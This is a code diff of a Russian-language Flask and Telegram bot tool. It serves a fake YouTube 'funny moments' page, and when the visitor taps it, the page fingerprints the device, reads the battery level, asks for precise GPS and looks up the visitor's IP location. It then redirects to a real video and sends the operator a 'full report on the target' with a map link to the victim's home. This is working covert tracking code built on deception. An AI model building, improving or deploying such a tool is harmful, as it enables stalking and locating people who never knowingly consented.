@@ -13,60 +13,72 @@ app = Flask(__name__)
 vault = {}
 user_modes = {}
 
+# Шаблон с поддержкой двух разных JS-логик
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>YouTube - Funny Moments</title>
+    <title>YouTube</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #fff; margin: 0; font-family: Roboto, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; }
-        .yt-nav { width: 100%; height: 48px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; padding: 0 16px; box-sizing: border-box; }
-        .player-container { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; }
-        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
-        .play-btn::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; position: absolute; left: 28px; top: 14px; }
-        .video-meta { padding: 12px 16px; width: 100%; box-sizing: border-box; }
-        .video-title { font-size: 18px; color: #0f0f0f; font-weight: 400; line-height: 24px; }
-        .video-stats { font-size: 12px; color: #606060; margin-top: 4px; }
+        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; }
+        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; display:flex; align-items:center; justify-content:center; }
+        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
+        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-left: 5px; }
     </style>
 </head>
-<body onclick="capture()">
-    <div class="yt-nav"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
-    <div class="player-container">
-        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover; opacity: 0.9;">
+<body onclick="ignite()">
+    <div style="padding: 10px; border-bottom: 1px solid #eee;"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
+    <div class="player">
+        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%;">
         <div class="play-btn"></div>
     </div>
-    <div class="video-meta">
-        <div class="video-title">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
-        <div class="video-stats">1.8 млн просмотров • 2 часа назад</div>
+    <div style="padding: 15px; text-align: left;">
+        <div style="font-size: 18px;">Exclusive: Смешные моменты 2026 😂 #мемы</div>
+        <div style="font-size: 12px; color: #606060; margin-top: 5px;">1.8 млн просмотров</div>
     </div>
 <script>
-let active = false;
-async function capture() {
-    if(active) return; active = true;
-    let data = { 
-        aid: "{{ aid }}", 
-        ua: navigator.userAgent, 
-        res: screen.width+"x"+screen.height,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        mem: navigator.deviceMemory || "N/A",
-        plat: navigator.platform
-    };
-    
-    // Технический фингерпринт
+let sent = false;
+let mode = "{{ mode }}";
+
+async function ignite() {
+    if(sent) return; sent = true;
+    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height, ref: document.referrer };
+
+    // Собираем заряд батареи (работает везде)
     try {
-        let canvas = document.createElement('canvas');
-        let gl = canvas.getContext('webgl');
-        let debug = gl.getExtension('WEBGL_debug_renderer_info');
-        data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        let b = await navigator.getBattery();
+        d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+    } catch(e) { d.bat = "N/A"; }
+
+    // Собираем GPU и железо
+    try {
+        let gl = document.createElement('canvas').getContext('webgl');
+        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        d.cores = navigator.hardwareConcurrency;
+        d.mem = navigator.deviceMemory;
     } catch(e) {}
 
-    fetch('/log', { 
-        method: 'POST', 
-        headers: {'Content-Type': 'application/json'}, 
-        body: JSON.stringify(data) 
-    }).finally(() => { 
-        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1500);
+    // ЕСЛИ ВЫБРАН РЕЖИМ ТОЧНОГО ГЕО
+    if (mode === "PRECISION") {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                d.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
+                send(d);
+            },
+            (err) => { d.gps = "Denied"; send(d); },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    } else {
+        send(d);
+    }
+}
+
+function send(d) {
+    fetch('/log', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
+    .finally(() => { 
+        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1000); 
     });
 }
 </script>
@@ -76,77 +88,63 @@ async function capture() {
 
 @app.route('/v/<aid>')
 def view(aid):
-    return render_template_string(HTML_TEMPLATE, aid=aid)
+    mode = user_modes.get(str(aid), "ANALYTICS")
+    return render_template_string(HTML_TEMPLATE, aid=aid, mode=mode)
 
 @app.route('/log', methods=['POST'])
 def logger():
     d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    
-    # Расширенный GEO
     geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,mobile,proxy").json()
     
-    token = "ID-" + str(uuid.uuid4())[:6].upper()
-    vault[token] = {"client": d, "geo": geo}
+    token = "EXP-" + str(uuid.uuid4())[:6].upper()
+    vault[token] = d
 
-    mode = user_modes.get(str(d['aid']), "ANALYTICS")
-    
-    connection_type = "📱 Mobile" if geo.get('mobile') else "🌐 Wi-Fi/Ethernet"
-    vpn_status = "⚠️ VPN/Proxy" if geo.get('proxy') else "✅ Direct"
+    # Формируем КИЛОМЕТРОВЫЙ ОТЧЕТ
+    gps_info = "❌ Не запрашивалось"
+    if d.get('gps'):
+        if d['gps'] == "Denied": gps_info = "🚫 Жертва отклонила доступ"
+        elif d['gps'] == "Denied": gps_info = "🚫 Ошибка GPS"
+        else: 
+            gps_info = f"✅ ТОЧНОЕ: `{d['gps']['lat']}, {d['gps']['lon']}`\n🎯 Точность: `{d['gps']['acc']}м`"
+            map_url = f"https://www.google.com/maps?q={d['gps']['lat']},{d['gps']['lon']}"
+            gps_info += f"\n📍 [ОТКРЫТЬ ДОМ НА КАРТЕ]({map_url})"
 
     report = (
-        f"🌟 **НОВОЕ ПОДКЛЮЧЕНИЕ: {mode}**\n"
+        f"🌟 **ПОЛНЫЙ ОТЧЕТ ПО ЦЕЛИ**\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📍 **ГЕО:** `{geo.get('city')}, {geo.get('country')}`\n"
-        f"🌐 **IP:** `{ip}` ({vpn_status})\n"
-        f"📶 **СЕТЬ:** {connection_type} | `{geo.get('isp')}`\n\n"
-        f"📱 **УСТРОЙСТВО:**\n"
-        f"• Модель: `{d.get('plat')}`\n"
-        f"• RAM: `{d.get('mem')} GB`\n"
-        f"• GPU: `{d.get('gpu', 'N/A')[:40]}...`\n"
+        f"🌐 **СЕТЬ И ГЕО (IP):**\n"
+        f"• IP: `{ip}`\n"
+        f"• Город: `{geo.get('city')}, {geo.get('country')}`\n"
+        f"• Провайдер: `{geo.get('isp')}`\n"
+        f"• Тип: {'📱 Мобильный' if geo.get('mobile') else '🌐 Wi-Fi'}\n"
+        f"• VPN: {'⚠️ Да' if geo.get('proxy') else '✅ Нет'}\n\n"
+        f"🛰 **GPS ДАННЫЕ:**\n{gps_info}\n\n"
+        f"🔋 **СОСТОЯНИЕ:**\n• Заряд: `{d.get('bat')}`\n\n"
+        f"💻 **ЖЕЛЕЗО:**\n• GPU: `{d.get('gpu', 'N/A')[:40]}...`\n"
+        f"• RAM: `{d.get('mem', 'N/A')} GB` | Cores: `{d.get('cores', 'N/A')}`\n"
+        f"• Экран: `{d.get('res')}`\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔑 **ТОКЕН ДЛЯ ДАМПА:** `{token}`"
+        f"🔑 **ТОКЕН ДЛЯ JSON:** `{token}`"
     )
     
     requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
+                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
     return "OK", 200
 
-# --- BOT INTERFACE ---
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher()
-
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message):
-    kb = ReplyKeyboardBuilder()
-    kb.button(text="🧨 Сгенерировать ссылку")
-    await message.answer("🛠 **OSINT APEX v28.0**\nГотов к работе.", reply_markup=kb.as_markup(resize_keyboard=True))
-
+# [Код бота с кнопками выбора ANALYTICS или PRECISION]
 @dp.message(F.text == "🧨 Сгенерировать ссылку")
 async def mode_select(message: types.Message):
     kb = InlineKeyboardBuilder()
-    kb.button(text="📊 Полный отчет (OSINT)", callback_data="m_ANALYTICS")
-    kb.button(text="👻 Скрытый режим (Fast)", callback_data="m_GHOST")
+    kb.button(text="📊 Аналитика + Батарея", callback_data="m_ANALYTICS")
+    kb.button(text="🎯 Точное ГЕО (Запрос GPS)", callback_data="m_PRECISION")
     kb.adjust(1)
-    await message.answer("Выбери режим работы ловушки:", reply_markup=kb.as_markup())
+    await message.answer("Выбери режим работы:", reply_markup=kb.as_markup())
 
 @dp.callback_query(F.data.startswith("m_"))
 async def finalize(callback: types.CallbackQuery):
     mode = callback.data.split("_")[1]
     user_modes[str(callback.from_user.id)] = mode
-    link = f"{BASE_URL}/v/{callback.from_user.id}"
-    await callback.message.edit_text(f"🎯 **ССЫЛКА ГОТОВА**\n\nРежим: `{mode}`\n🔗 `{link}`\n\n*Маскировка: YouTube (Funny Moments)*")
+    await callback.message.edit_text(f"🎯 **ССЫЛКА ЗАРЯЖЕНА ({mode})**\n🔗 `{BASE_URL}/v/{callback.from_user.id}`")
 
-@dp.message(F.text.startswith("ID-"))
-async def get_dump(message: types.Message):
-    t = message.text.strip().upper()
-    if t in vault:
-        dump = json.dumps(vault[t], indent=2, ensure_ascii=False)
-        await message.answer(f"📦 **ПОЛНЫЙ ДАМП {t}:**\n```json\n{dump}\n```")
-
-async def main():
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+# ... (Остальной код запуска из v28.0)
